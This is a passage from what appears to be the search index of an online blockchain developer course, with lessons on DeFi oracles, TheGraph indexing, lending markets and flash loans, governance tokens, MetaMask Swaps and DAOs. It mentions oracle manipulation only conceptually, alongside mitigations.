infrastructure\u2014for example, Bancor uses Chainlink to mitigate impermanent loss . Oracle Attacks in DeFi When looking to get the price of assets, many DeFi users mistake using their own liquidity pools to price an asset or using a poor oracle source. An architecture where a protocol relies on itself to get the value of an underlying asset is a target for attack. Attackers can use flash loans to manipulate the price in their liquidity pools , and therefore ruin any computation using the liquidity pools for pricing. Flash loans are discussed later in the DeFi Lending lesson. Decentralized exchange data can be manipulated, so they are not good decentralized data sources and don't work as decentralized oracles. However, there are exceptions. For example, Uniswap takes the average price across a time period of around 30 minutes and uses that as the price. This is known as getting the TWAP (Time Weighted Average Price). Using a more robust decentralized solution like Chainlink will protect you from these oracle manipulation / flash loan attacks. A further look into Oracles You can create your own oracles . To understand how to use oracles in general, here is a good starter tutorial . Check out Chainlink's tutorial for a deeper dive and their video walk through . Creating a highly robust oracle requires much thought because oracle data inputs directly determine the consuming smart contracts' outputs. This leads to the Oracle Problem . Hence, oracles need to be as decentralized, secure and reliable as the blockchain networks that run them. If not, it's pointless to use a blockchain network. Single centralized nodes are subject to single points of failure if a node becomes corrupted or goes offline. Decentralization and [having multiple data providers is essential since it's difficult to know if a provider is trustworthy, introducing risk. The data source could go offline or deliver bad data. You can get a pretty comprehensive look into decentralized oracles here . Indexers As mentioned, Oracles can provide data about the real world. Yet smart contracts can create data themselves, which may be important to a protocol. With all this internal chain data, how do you organize and find it? We use Indexers, which are decentralized methods to collect, organize and query information. Think of them as what Google does for information, but for on-chain data. This allows for the easy querying of data. Ethereum is a networked decentralized database. Yet to query data, we have to look at event logs. Wouldn't it be better if we had a language we could query data with easier? We can now use TheGraph Protocol , a decentralized protocol for indexing and querying blockchain data that uses GraphQL as query language. Think of it as the \"Google of blockchains\" since indexing and sorting are what search engines do. TheGraph solves the problem of querying on-chain data as dapps grow in size . TheGraph Protocol is explained very well here . [GraphQL] allows for an easier way of querying of data compared to REST APIs . Instead of getting the whole dataset, GraphQL allows for tailoring. GraphQL enables you to send queries to get precisely the data you're looking for in one request instead of working with strict server-defined endpoints . Luckily, it builds upon knowledge of REST, and the basics picked up quickly . You can learn how to use TheGraph protocol via their developer docs and developer academy . Indexers and Oracles You can use TheGraph and ChainLink described Chainlink's description , EthGlobal's TheGraph Protocol workshop and TheGraph's blog . Additional Resources 77+ Smart Contract Use Cases Enabled By Chainlink Aave Oracles The Importance of Data Quality for DeFi Smart Contracts Flash Loans and Tamper Proof Oracles TheGraph Academy - GraphQL tutorial via EggHead.io Article: Chainlink basic request model tutorial Tutorial demonstrating Chainlink basic request model locally using truffle,ganache , solidity and kubernetes. Article: Chainlink decentralized data model tutorial Deep dive tutorial on Chainlink decentralized data feed.","title":"Oracles in DeFi"},{"location":"S05a-defi/M6-oracles/L1/#oracles-in-defi","text":"Oracles are an essential part of DeFi since finance cannot exist in a vacuum without information. Oracles are bridges between a blockchain and the real world. They are used as queriable on-chain APIs to get information into smart contracts. The data could be anything from price information, weather reports, random numbers or more. Oracles can also be bi-directional and can \"send\" data out to the real world. They are further described here . Many top DeFi applications by total value locked use oracles in some manner. Some of the most popular use cases are collecting pricing data, event-driven decentralized execution, and random number generation. Some popular oracle sources are Chainlink and Tellor . Chainlink is described here . Protocols like Uniswap and Maker can also act like oracles, since they can provide data from their feeds. In fact Compound Finance uses Uniswap v2 data in conjuction with Chainlink . Oracles in DeFi are used for a wealth of different reasons: To get the value of underlying collateral (such as Aave , Synthetix , Compound ) To generate a random lottery winner (such as PoolTogether Margin Trading (such as SushiSwap Execute decentralized event-driven tasks, so that your contracts react to events ! The oracle can execute your contracts if a certain event happens. Verify a stablecoin's collateral Fetch Cryptocurrency prices And more. For many of these DeFi services to work and not be exploited, they need to be connected to the real world to operate correctly. As a result, oracles are used within the popular lending or swaps protocol infrastructure\u2014for example, Bancor uses Chainlink to mitigate impermanent loss .","title":"Oracles in DeFi"},{"location":"S05a-defi/M6-oracles/L1/#oracle-attacks-in-defi","text":"When looking to get the price of assets, many DeFi users mistake using their own liquidity pools to price an asset or using a poor oracle source. An architecture where a protocol relies on itself to get the value of an underlying asset is a target for attack. Attackers can use flash loans to manipulate the price in their liquidity pools , and therefore ruin any computation using the liquidity pools for pricing. Flash loans are discussed later in the DeFi Lending lesson. Decentralized exchange data can be manipulated, so they are not good decentralized data sources and don't work as decentralized oracles. However, there are exceptions. For example, Uniswap takes the average price across a time period of around 30 minutes and uses that as the price. This is known as getting the TWAP (Time Weighted Average Price). Using a more robust decentralized solution like Chainlink will protect you from these oracle manipulation / flash loan attacks.","title":"Oracle Attacks in DeFi"},{"location":"S05a-defi/M6-oracles/L1/#a-further-look-into-oracles","text":"You can create your own oracles . To understand how to use oracles in general, here is a good starter tutorial . Check out Chainlink's tutorial for a deeper dive and their video walk through . Creating a highly robust oracle requires much thought because oracle data inputs directly determine the consuming smart contracts' outputs. This leads to the Oracle Problem . Hence, oracles need to be as decentralized, secure and reliable as the blockchain networks that run them. If not, it's pointless to use a blockchain network. Single centralized nodes are subject to single points of failure if a node becomes corrupted or goes offline. Decentralization and [having multiple data providers is essential since it's difficult to know if a provider is trustworthy, introducing risk. The data source could go offline or deliver bad data. You can get a pretty comprehensive look into decentralized oracles here .","title":"A further look into Oracles"},{"location":"S05a-defi/M6-oracles/L1/#indexers","text":"As mentioned, Oracles can provide data about the real world. Yet smart contracts can create data themselves, which may be important to a protocol. With all this internal chain data, how do you organize and find it? We use Indexers, which are decentralized methods to collect, organize and query information. Think of them as what Google does for information, but for on-chain data. This allows for the easy querying of data. Ethereum is a networked decentralized database. Yet to query data, we have to look at event logs. Wouldn't it be better if we had a language we could query data with easier? We can now use TheGraph Protocol , a decentralized protocol for indexing and querying blockchain data that uses GraphQL as query language. Think of it as the \"Google of blockchains\" since indexing and sorting are what search engines do. TheGraph solves the problem of querying on-chain data as dapps grow in size . TheGraph Protocol is explained very well here . [GraphQL] allows for an easier way of querying of data compared to REST APIs . Instead of getting the whole dataset, GraphQL allows for tailoring. GraphQL enables you to send queries to get precisely the data you're looking for in one request instead of working with strict server-defined endpoints . Luckily, it builds upon knowledge of REST, and the basics picked up quickly . You can learn how to use TheGraph protocol via their developer docs and developer academy .","title":"Indexers"},{"location":"S05a-defi/M6-oracles/L1/#indexers-and-oracles","text":"You can use TheGraph and ChainLink described Chainlink's description , EthGlobal's TheGraph Protocol workshop and TheGraph's blog .","title":"Indexers and Oracles"},{"location":"S05a-defi/M6-oracles/L1/#additional-resources","text":"77+ Smart Contract Use Cases Enabled By Chainlink Aave Oracles The Importance of Data Quality for DeFi Smart Contracts Flash Loans and Tamper Proof Oracles TheGraph Academy - GraphQL tutorial via EggHead.io Article: Chainlink basic request model tutorial Tutorial demonstrating Chainlink basic request model locally using truffle,ganache , solidity and kubernetes. Article: Chainlink decentralized data model tutorial Deep dive tutorial on Chainlink decentralized data feed.","title":"Additional Resources"},{"location":"S05a-defi/M7-defi-lending/L1/","text":"DeFi Lending Markets The Use of Lending Markets Lending is a fundamental financial mechanism in finance and DeFi. Lending helps take excess capital from savers and allocates it to borrowers, putting the funds to productive use. This helps create economic growth while generating a return for savers. It's also used for hedging and mitigating risk. On the other hand, lending creates debt, which, if not properly managed, can cause instability to cascade through connected markets, leading to economic and market contractions. These issues are magnified in DeFi because networks are interdependent and open to anyone. DeFi lending markets allow users to become borrowers and lenders in a decentralized way without giving up custody of their funds. It is more efficient since it enables permissionless and programmatic access to capital without a credit check. Being on Ethereum means that any program can access these markets, providing a money lego around lending. Using a peer to contract pattern, lenders and borrowers can interact with the contract and simplify negotiating loan terms or managing counterparty risk themselves. This lowers frictions costs and while being scalable. Overcollateralization as a DeFi Primitive Since DeFi protocols are open and pseudonymous, uncollateralized loans are not possible. You have to put up assets to get funds. Providing collateral ensures the counterparty cannot steal the funds or default on a loan. Due to the volatility risk of crypto assets used as collateral, over-collateralization is required. Issuing debt via over-collateralization is a typical pattern in DeFi . The pattern can also help limit the amount of leverage , and control risk for a protocol since assets need to be greater than liabilities. The level of over-collateralization is represented by the loan-to-collateral ratio stated by the protocol. The loan-to-collateral ratio is the percentage you can borrow of an asset relative to the collateral deposited. Other names for the same idea include collateral factor, collateral ratio, cFactor or cRatio. Since we cannot borrow more than we deposit, the cFactor is always below 100%. Depending on the quality of the asset, the collateralization ratio is set. Why collateral? Debt The ability to add collateral and adjust a token's supply allows for issuing a debt token backed by collateral. This debt token can represent a utility token like a lending market position from Compound.finance or Aave. For example, in Compound Finance, a DAI debt token would be cDAI, while in Aave aDAI. If DAI's collateral factor is 75%, then with $100 worth of collateral, you can borrow 75 DAI. Other DeFi 101 lending concepts like the importance of price oracles to update price can be found here . Loans and Incentives Why would anyone take out an over collateralized loan ? Why not just sell the assets? One reason is to avoid or delay paying capital gains taxes when selling. If the user has excess capital, the user can earn interest on their stablecoin. Or to increase their liquidity without having to sell their assets and only having to pay the interest. This liquidity can be used as leverage to short an asset or to fund an unexpected expense. A user can profit by leveraging a long position or shorting on an asset through lending markets. Going long means expecting the asset's price to appreciate. If the user expects ETH to go up in value, they can deposit their ETH to borrow USDC. Then use USDC to buy more ETH. The user gets exposure to more ETH minus the interest rate. Say the collateral factor is 50% on a deposit of $1000 worth of ETH. The borrower receives 500 USDC and then can buy more ETH. So they can leverage themselves to $1,500 worth of ETH. To turn a profit, the appreciation of ETH should exceed the interest and gas fees required to pay back the loan. Going short means expecting the asset will lose value in price. If the user expects ETH to depreciate, they can deposit USDC to borrow ETH. Then sell the ETH and repurchase it later at a lower price, making a profit in the difference. Say ETH is at $1000 when the user sells it. Later, they buy the asset back at $300. They get to pocket $700 minus the interest payment and gas fees. Liquidation and Incentives Liquidation involves a user's position being closed to pay the debt incurred. This happens if the collateral's value drops below the acceptable collateral ratio. Lending protocols often use an Oracle service like ChainLink and the price feed of a major exchange like Uniswap to provide real-time data about a collateral's value. Since smart contracts cannot act without being called, liquidation occurs by offering incentives to an external entity called a \"keeper\". The keeper can liquidate the position and keep a percentage fee. Then, the collateral is auctioned off or via a decentralized exchange at market price. In some protocols, everything is auctioned off. In others, the remaining collateral is left in the original contract. An example can be if the collateralization ratio is 200% and the user only placed the bare minimum. If the asset drops 1%, the protocol will liquidate 2% of the collateral. Since liquidation is costly, some protocols allow users to add additional collateral if needed, similar to a margin call . It is wise to add a margin of safety in addition to the collateral ratio. Applications: Compound Finance and Aave An application of lending markets are money markets. Within DeFi open-source algorithmic money market protocols allow anyone to borrow or lend cryptocurrency assets by only providing collateral. These lending markets connect lenders who wish to earn interest and borrowers who want to borrow for various reasons and pay interest. Users can provide assets with d liquidity like ETH, WITH, DAI, USDT, USDC, LINK, etc. The two leading platforms are Compound.finance and Aave ( ghost in Finnish ). Explained in the links, Compound Finance and Aave work by using lending pools . A lending pool locks up capital and generates an algorithmically determined interest rate based on supply and demand. You can learn how to use Aave and Compound. Interest and Lending Lending requires borrowers and lenders. Borrowers pay interest while lenders earn interest. Whether you borrow or lend, you must lock up capital into a lending pool inside a contract. In return, you earn a debt token, in Compound's case a cToken, derived from the asset in question. DAI, you get cDAI, BAT renders cBAT and so on. This token accrues interest over time and can be traded or used as collateral in other protocols. For the lender to unlock their collateral, they must pay the interest accrued plus the collateral. For both Aave and Compound, there is no time period to close the loan. Lending can occur with variable rate interest based on market demand or fixed interest rates. Variable interest rates adjust due to the demand and supply for the asset in question. The key to note is that the borrow interest rate is always higher than the supply rate. Lending protocols operate in real-time. Rates are adjusted, and interest is accrued every new Ethereum block. Interest is typically accrued to the debt token or accounts tied to the lending pool. Aave lets users redirect their stream of interest to other contracts. This allows for interesting applications where pools of money can be programmatically deployed to earn interest. One can seperate the marketing logic form the interest earning logic. An example of this can be PoolTogether which is a no loss lottery where the winner wins the interest accumulated and doesn't sacrifice the principal. A similar project could focus on the marketing of new application of lending pools, like no loss poker, and leverage Aave's money lego to deal with the interest. Aave offers a stable interest rate , which means it's fixed for a short term and can change depending on borrowing and lending dynamics of the pool. Other platforms offer fixed interest rates, like Notional , 88mph and Barnbridge . Typically, the longer the loan, the higher the risk, the higher the interest rate. On Ethereum, we measure time in blocks. What if we went in reverse? If a loan and a position could be executed in the same block, what happens? We get flash loans! Flash Loans as a DeFi Primitive DeFi allows the creation of something called Flash Loans . Introduced by Aave, flash loans are the first uncollateralized loans that can be accessed in a permissionless way. This means that anyone anywhere can access large sums of capital. They are explained here . Flash Loans only have one condition: Payback the loan within 1 Ethereum block. Since all protocols share the same database on Ethereum, flash loans can interact with various protocols in one block to find opportunities. The loan only goes through if the transaction results in the loan being repaid. If not, the entire transaction reverts, like it was never sent! A cool application of Flash Loans is the ability to do Flash Swaps. Learn how to create Flash Swaps with Infura here. This can be used to hedge against liquidation risk by swapping a volatile asset into a stable asset! Risks With DeFi Lending Markets, there is zero counterparty risk. However, smart contract risk always exists. Duration risk comes in borrowers being hit with spiking variable borrowing APY rates if they are not paying attention. This can cause a user to get liquidated by having to repay more than expected. When hedging, there is the risk of the trade going the other way.","title":"DeFi Lending Markets"},{"location":"S05a-defi/M7-defi-lending/L1/#defi-lending-markets","text":"","title":"DeFi Lending Markets"},{"location":"S05a-defi/M7-defi-lending/L1/#the-use-of-lending-markets","text":"Lending is a fundamental financial mechanism in finance and DeFi. Lending helps take excess capital from savers and allocates it to borrowers, putting the funds to productive use. This helps create economic growth while generating a return for savers. It's also used for hedging and mitigating risk. On the other hand, lending creates debt, which, if not properly managed, can cause instability to cascade through connected markets, leading to economic and market contractions. These issues are magnified in DeFi because networks are interdependent and open to anyone. DeFi lending markets allow users to become borrowers and lenders in a decentralized way without giving up custody of their funds. It is more efficient since it enables permissionless and programmatic access to capital without a credit check. Being on Ethereum means that any program can access these markets, providing a money lego around lending. Using a peer to contract pattern, lenders and borrowers can interact with the contract and simplify negotiating loan terms or managing counterparty risk themselves. This lowers frictions costs and while being scalable.","title":"The Use of Lending Markets"},{"location":"S05a-defi/M7-defi-lending/L1/#overcollateralization-as-a-defi-primitive","text":"Since DeFi protocols are open and pseudonymous, uncollateralized loans are not possible. You have to put up assets to get funds. Providing collateral ensures the counterparty cannot steal the funds or default on a loan. Due to the volatility risk of crypto assets used as collateral, over-collateralization is required. Issuing debt via over-collateralization is a typical pattern in DeFi . The pattern can also help limit the amount of leverage , and control risk for a protocol since assets need to be greater than liabilities. The level of over-collateralization is represented by the loan-to-collateral ratio stated by the protocol. The loan-to-collateral ratio is the percentage you can borrow of an asset relative to the collateral deposited. Other names for the same idea include collateral factor, collateral ratio, cFactor or cRatio. Since we cannot borrow more than we deposit, the cFactor is always below 100%. Depending on the quality of the asset, the collateralization ratio is set. Why collateral?","title":"Overcollateralization as a DeFi Primitive"},{"location":"S05a-defi/M7-defi-lending/L1/#debt","text":"The ability to add collateral and adjust a token's supply allows for issuing a debt token backed by collateral. This debt token can represent a utility token like a lending market position from Compound.finance or Aave. For example, in Compound Finance, a DAI debt token would be cDAI, while in Aave aDAI. If DAI's collateral factor is 75%, then with $100 worth of collateral, you can borrow 75 DAI. Other DeFi 101 lending concepts like the importance of price oracles to update price can be found here .","title":"Debt"},{"location":"S05a-defi/M7-defi-lending/L1/#loans-and-incentives","text":"Why would anyone take out an over collateralized loan ? Why not just sell the assets? One reason is to avoid or delay paying capital gains taxes when selling. If the user has excess capital, the user can earn interest on their stablecoin. Or to increase their liquidity without having to sell their assets and only having to pay the interest. This liquidity can be used as leverage to short an asset or to fund an unexpected expense. A user can profit by leveraging a long position or shorting on an asset through lending markets. Going long means expecting the asset's price to appreciate. If the user expects ETH to go up in value, they can deposit their ETH to borrow USDC. Then use USDC to buy more ETH. The user gets exposure to more ETH minus the interest rate. Say the collateral factor is 50% on a deposit of $1000 worth of ETH. The borrower receives 500 USDC and then can buy more ETH. So they can leverage themselves to $1,500 worth of ETH. To turn a profit, the appreciation of ETH should exceed the interest and gas fees required to pay back the loan. Going short means expecting the asset will lose value in price. If the user expects ETH to depreciate, they can deposit USDC to borrow ETH. Then sell the ETH and repurchase it later at a lower price, making a profit in the difference. Say ETH is at $1000 when the user sells it. Later, they buy the asset back at $300. They get to pocket $700 minus the interest payment and gas fees.","title":"Loans and Incentives"},{"location":"S05a-defi/M7-defi-lending/L1/#liquidation-and-incentives","text":"Liquidation involves a user's position being closed to pay the debt incurred. This happens if the collateral's value drops below the acceptable collateral ratio. Lending protocols often use an Oracle service like ChainLink and the price feed of a major exchange like Uniswap to provide real-time data about a collateral's value. Since smart contracts cannot act without being called, liquidation occurs by offering incentives to an external entity called a \"keeper\". The keeper can liquidate the position and keep a percentage fee. Then, the collateral is auctioned off or via a decentralized exchange at market price. In some protocols, everything is auctioned off. In others, the remaining collateral is left in the original contract. An example can be if the collateralization ratio is 200% and the user only placed the bare minimum. If the asset drops 1%, the protocol will liquidate 2% of the collateral. Since liquidation is costly, some protocols allow users to add additional collateral if needed, similar to a margin call . It is wise to add a margin of safety in addition to the collateral ratio. Applications: Compound Finance and Aave An application of lending markets are money markets. Within DeFi open-source algorithmic money market protocols allow anyone to borrow or lend cryptocurrency assets by only providing collateral. These lending markets connect lenders who wish to earn interest and borrowers who want to borrow for various reasons and pay interest. Users can provide assets with d liquidity like ETH, WITH, DAI, USDT, USDC, LINK, etc. The two leading platforms are Compound.finance and Aave ( ghost in Finnish ). Explained in the links, Compound Finance and Aave work by using lending pools . A lending pool locks up capital and generates an algorithmically determined interest rate based on supply and demand. You can learn how to use Aave and Compound.","title":"Liquidation and Incentives"},{"location":"S05a-defi/M7-defi-lending/L1/#interest-and-lending","text":"Lending requires borrowers and lenders. Borrowers pay interest while lenders earn interest. Whether you borrow or lend, you must lock up capital into a lending pool inside a contract. In return, you earn a debt token, in Compound's case a cToken, derived from the asset in question. DAI, you get cDAI, BAT renders cBAT and so on. This token accrues interest over time and can be traded or used as collateral in other protocols. For the lender to unlock their collateral, they must pay the interest accrued plus the collateral. For both Aave and Compound, there is no time period to close the loan. Lending can occur with variable rate interest based on market demand or fixed interest rates. Variable interest rates adjust due to the demand and supply for the asset in question. The key to note is that the borrow interest rate is always higher than the supply rate. Lending protocols operate in real-time. Rates are adjusted, and interest is accrued every new Ethereum block. Interest is typically accrued to the debt token or accounts tied to the lending pool. Aave lets users redirect their stream of interest to other contracts. This allows for interesting applications where pools of money can be programmatically deployed to earn interest. One can seperate the marketing logic form the interest earning logic. An example of this can be PoolTogether which is a no loss lottery where the winner wins the interest accumulated and doesn't sacrifice the principal. A similar project could focus on the marketing of new application of lending pools, like no loss poker, and leverage Aave's money lego to deal with the interest. Aave offers a stable interest rate , which means it's fixed for a short term and can change depending on borrowing and lending dynamics of the pool. Other platforms offer fixed interest rates, like Notional , 88mph and Barnbridge . Typically, the longer the loan, the higher the risk, the higher the interest rate. On Ethereum, we measure time in blocks. What if we went in reverse? If a loan and a position could be executed in the same block, what happens? We get flash loans!","title":"Interest and Lending"},{"location":"S05a-defi/M7-defi-lending/L1/#flash-loans-as-a-defi-primitive","text":"DeFi allows the creation of something called Flash Loans . Introduced by Aave, flash loans are the first uncollateralized loans that can be accessed in a permissionless way. This means that anyone anywhere can access large sums of capital. They are explained here . Flash Loans only have one condition: Payback the loan within 1 Ethereum block. Since all protocols share the same database on Ethereum, flash loans can interact with various protocols in one block to find opportunities. The loan only goes through if the transaction results in the loan being repaid. If not, the entire transaction reverts, like it was never sent! A cool application of Flash Loans is the ability to do Flash Swaps. Learn how to create Flash Swaps with Infura here. This can be used to hedge against liquidation risk by swapping a volatile asset into a stable asset!","title":"Flash Loans as a DeFi Primitive"},{"location":"S05a-defi/M7-defi-lending/L1/#risks","text":"With DeFi Lending Markets, there is zero counterparty risk. However, smart contract risk always exists. Duration risk comes in borrowers being hit with spiking variable borrowing APY rates if they are not paying attention. This can cause a user to get liquidated by having to repay more than expected. When hedging, there is the risk of the trade going the other way.","title":"Risks"},{"location":"S05a-defi/M8-governance/L1/","text":"What are Governance Tokens Decentralized networks have no central entity to manage them. Governance tokens were created to help the community steer the network . Governance tokens represent a percentage of voting power, called \u201cpro-rata voting rights\u201d, over a protocol or network. These tokens typically have code that embeds rules related to how the system can change, like adjusting configurations or adding new components. The ability to adjust a network is essential because DeFi protocols need to stay in sync and react to changing market conditions. It also allows the network to evolve as the ecosystem matures. Examples of governance tokens include Yearn.finance YFI, Compound Finance COMP, UniSwap UNI, AirSwap AST. Due to their influence over a network, they can accrue value and are traded on exchanges. Governance tokens rely on incentives to encourage or discourage certain behaviors which maintain network security, solvency and growth. Incentives are powerful tools . Through the use of code to enforce, promote and punish certain behaviors, blockchain-based systems from the base layer to DeFi protocols layer can create stability and promote coordination absent a central authority. Properly designed incentives can reward early supporters and the initial development team . Or they can result in pump and dumps. Designing these incentives requires good Tokenomics. Tokenomics deals with the management of token economies, including token creation, removal, and applied network incentives. These incentives are best seen at work in treasury management, which deals with the network\u2019s supply of tokens. Tokenomics is not to be confused with CryptoEconomics or the use of economic incentives to provide guarantees about applications in open and adversarial networks. Tokenomics is about coordinating participants, while CryptoEconomics focuses on securing the underlying system . A token\u2019s policy could be inflationary, deflationary or static. Inflationary policies increase the number of tokens through minting. Deflation reduces tokens through burning tokens. Static policies keep them the same. The policies can be used to encourage different actions. Inflation can be used to bootstrap a network by compensating users for activities to achieve utility, network participants and liquidity. As long as the network\u2019s utility is greater than the inflation rate, it could make sense to increase the supply. This could be measured by many indicators like network activity and the price for the token. Treasury management is deeply linked to community management since how you incentivize and manage tokens leads to community engagement. An application of this are liquidity mining programs. These provide staking rewards as a positive incentive for users to provide liquidity to a network. Users are credited with a bonus in their token account, based on their stake. They function as a marketing expense to bootstrap networks. Airdrops are another popular form of distribution, the most famous being UniSwap to retain liquidity from being sucked away by competing platforms. Pioneered by Compound.finance , users were rewarded by engaging in certain behaviors and received tokens which could be used for governance. This model was copied by others and led to the DeFi Summer of 2020. Seeking a return from these tokens led to yield farming , the activity of moving assets between protocols to gain a maximum return. There are also incentives to discourage negative behavior like slashing funds for certain actions or liquidations for undercollateralized positions. Further incentives include direct rewards where users can be paid for providing liquidity to a pool and earn a fee in proportion to the amount staked. Not all DeFi protocols or blockchain applications are decentralized. If a protocol\u2019s governance can be centralized if it\u2019s only controlled by the admins. True decentralization implies decentralized infrastructure and governance. Governance token holders exercise their influence via DAOs, short for decentralized autonomous organizations. They can be airdropped to users of a platform to transition to a DAO like Shapeshift did in July 2021 . We will cover DAOs in a later section. Additional Resources Compound Governance Contracts Walkthrough Governance and Voting","title":"What are Governance Tokens"},{"location":"S05a-defi/M8-governance/L1/#what-are-governance-tokens","text":"Decentralized networks have no central entity to manage them. Governance tokens were created to help the community steer the network . Governance tokens represent a percentage of voting power, called \u201cpro-rata voting rights\u201d, over a protocol or network. These tokens typically have code that embeds rules related to how the system can change, like adjusting configurations or adding new components. The ability to adjust a network is essential because DeFi protocols need to stay in sync and react to changing market conditions. It also allows the network to evolve as the ecosystem matures. Examples of governance tokens include Yearn.finance YFI, Compound Finance COMP, UniSwap UNI, AirSwap AST. Due to their influence over a network, they can accrue value and are traded on exchanges. Governance tokens rely on incentives to encourage or discourage certain behaviors which maintain network security, solvency and growth. Incentives are powerful tools . Through the use of code to enforce, promote and punish certain behaviors, blockchain-based systems from the base layer to DeFi protocols layer can create stability and promote coordination absent a central authority. Properly designed incentives can reward early supporters and the initial development team . Or they can result in pump and dumps. Designing these incentives requires good Tokenomics. Tokenomics deals with the management of token economies, including token creation, removal, and applied network incentives. These incentives are best seen at work in treasury management, which deals with the network\u2019s supply of tokens. Tokenomics is not to be confused with CryptoEconomics or the use of economic incentives to provide guarantees about applications in open and adversarial networks. Tokenomics is about coordinating participants, while CryptoEconomics focuses on securing the underlying system . A token\u2019s policy could be inflationary, deflationary or static. Inflationary policies increase the number of tokens through minting. Deflation reduces tokens through burning tokens. Static policies keep them the same. The policies can be used to encourage different actions. Inflation can be used to bootstrap a network by compensating users for activities to achieve utility, network participants and liquidity. As long as the network\u2019s utility is greater than the inflation rate, it could make sense to increase the supply. This could be measured by many indicators like network activity and the price for the token. Treasury management is deeply linked to community management since how you incentivize and manage tokens leads to community engagement. An application of this are liquidity mining programs. These provide staking rewards as a positive incentive for users to provide liquidity to a network. Users are credited with a bonus in their token account, based on their stake. They function as a marketing expense to bootstrap networks. Airdrops are another popular form of distribution, the most famous being UniSwap to retain liquidity from being sucked away by competing platforms. Pioneered by Compound.finance , users were rewarded by engaging in certain behaviors and received tokens which could be used for governance. This model was copied by others and led to the DeFi Summer of 2020. Seeking a return from these tokens led to yield farming , the activity of moving assets between protocols to gain a maximum return. There are also incentives to discourage negative behavior like slashing funds for certain actions or liquidations for undercollateralized positions. Further incentives include direct rewards where users can be paid for providing liquidity to a pool and earn a fee in proportion to the amount staked. Not all DeFi protocols or blockchain applications are decentralized. If a protocol\u2019s governance can be centralized if it\u2019s only controlled by the admins. True decentralization implies decentralized infrastructure and governance. Governance token holders exercise their influence via DAOs, short for decentralized autonomous organizations. They can be airdropped to users of a platform to transition to a DAO like Shapeshift did in July 2021 . We will cover DAOs in a later section.","title":"What are Governance Tokens"},{"location":"S05a-defi/M8-governance/L1/#additional-resources","text":"Compound Governance Contracts Walkthrough Governance and Voting","title":"Additional Resources"},{"location":"S05a-defi/M9-swaps/L1/","text":"Introduction to MetaMask Swaps The previous section covered decentralized exchanges and briefly touched upon aggregators, which finds the best price between exchanges. We can go a step further and have aggregators of aggregators. The most popular aggregator of aggregators is MetaMask Swaps. MetaMask Swaps addresses five issues 1 | Barrier to entry is high Before interacting with different DeFi protocols, users must first familiarize themselves with those platforms and understand the pros and cons of each. 2 | Rates vary between protocols Not all liquidity sources (DEX, DEX aggregators, and PMMs) are created equal. The rate that each protocol provides may depend on liquidity depth, pricing mechanism, and type of tokens. 3 | Gas usage differs between sources The route and complexity of each Swap may differ, depending on the liquidity source. Some sources will require less gas, depending on the route. 4 | Liquidity is fragmented Decentralization leads to liquidity fragmentation. For some trades, splitting a Swap between multiple sources can result in the most favorable trade. 5 | Token approvals are messy and expensive When Swapping ERC20 tokens, users must first approve individual tokens on each liquidity source. MetaMask Swaps solves these issues with three things 1 | Best rates across DeFi By requesting prices from all available DEXs, DEX aggregators, and individual market makers, we can guarantee that MetaMask users have access to the deepest liquidity, the largest selection of tokens, and the most competitive prices. 2 | Seamless and standardized UX We\u2019ve abstracted all the complexities, allowing MetaMask users to Swap > 1,000 unique tokens in three clicks. 3 | Approve once, Swap anywhere No need to approve every token on multiple DEXs and aggregators for each trade. With Swaps, users only need to approve each token once, reducing gas costs and shortening the path to executing their trade. Additional Material Users Guide to Swaps (Metamask)","title":"Introduction to MetaMask Swaps"},{"location":"S05a-defi/M9-swaps/L1/#introduction-to-metamask-swaps","text":"The previous section covered decentralized exchanges and briefly touched upon aggregators, which finds the best price between exchanges. We can go a step further and have aggregators of aggregators. The most popular aggregator of aggregators is MetaMask Swaps.","title":"Introduction to MetaMask Swaps"},{"location":"S05a-defi/M9-swaps/L1/#metamask-swaps-addresses-five-issues","text":"","title":"MetaMask Swaps addresses five issues"},{"location":"S05a-defi/M9-swaps/L1/#1-barrier-to-entry-is-high","text":"Before interacting with different DeFi protocols, users must first familiarize themselves with those platforms and understand the pros and cons of each.","title":"1 | Barrier to entry is high"},{"location":"S05a-defi/M9-swaps/L1/#2-rates-vary-between-protocols","text":"Not all liquidity sources (DEX, DEX aggregators, and PMMs) are created equal. The rate that each protocol provides may depend on liquidity depth, pricing mechanism, and type of tokens.","title":"2 | Rates vary between protocols"},{"location":"S05a-defi/M9-swaps/L1/#3-gas-usage-differs-between-sources","text":"The route and complexity of each Swap may differ, depending on the liquidity source. Some sources will require less gas, depending on the route.","title":"3 | Gas usage differs between sources"},{"location":"S05a-defi/M9-swaps/L1/#4-liquidity-is-fragmented","text":"Decentralization leads to liquidity fragmentation. For some trades, splitting a Swap between multiple sources can result in the most favorable trade.","title":"4 | Liquidity is fragmented"},{"location":"S05a-defi/M9-swaps/L1/#5-token-approvals-are-messy-and-expensive","text":"When Swapping ERC20 tokens, users must first approve individual tokens on each liquidity source.","title":"5 | Token approvals are messy and expensive"},{"location":"S05a-defi/M9-swaps/L1/#metamask-swaps-solves-these-issues-with-three-things","text":"","title":"MetaMask Swaps solves these issues with three things"},{"location":"S05a-defi/M9-swaps/L1/#1-best-rates-across-defi","text":"By requesting prices from all available DEXs, DEX aggregators, and individual market makers, we can guarantee that MetaMask users have access to the deepest liquidity, the largest selection of tokens, and the most competitive prices.","title":"1 | Best rates across DeFi"},{"location":"S05a-defi/M9-swaps/L1/#2-seamless-and-standardized-ux","text":"We\u2019ve abstracted all the complexities, allowing MetaMask users to Swap > 1,000 unique tokens in three clicks.","title":"2 | Seamless and standardized UX"},{"location":"S05a-defi/M9-swaps/L1/#3-approve-once-swap-anywhere","text":"No need to approve every token on multiple DEXs and aggregators for each trade. With Swaps, users only need to approve each token once, reducing gas costs and shortening the path to executing their trade.","title":"3 | Approve once, Swap anywhere"},{"location":"S05a-defi/M9-swaps/L1/#additional-material","text":"Users Guide to Swaps (Metamask)","title":"Additional Material"},{"location":"S06-daos/M1-understand/","text":"DAO - Decentralized Autonomous Organizations \u201cIf you want to go fast, go alone. If you want to go far, go together.\u201d \u2013 African proverb. Understand a DAO What are they? DAOs or Decentralized Autonomous Organizations are member-owned communities with a built-in treasury, no central leadership, and whose rules of engagement are codified into smart contracts. They can be a safe way to collaborate with internet strangers while committing funds towards a specific cause. DAOs are a mechanism for social scalability since they allow members to organize and direct capital towards goals in a trustless and fluid manner. The use of smart contracts allows for the transparency of funds, the rules of operation, and the creation of incentive mechanisms to provide security guarantees around member actions. Thus the economics and control of an organization are laid out transparently, allowing for \u201ctrustless\u201d peer to peer participation in open and insecure networks. Aragon further explains DAOs, a DAO framework we will soon explore. An excellent visual description of DAOs can be found here . Finally, you can find a list of interesting DAO resources via DAOtalk.org and 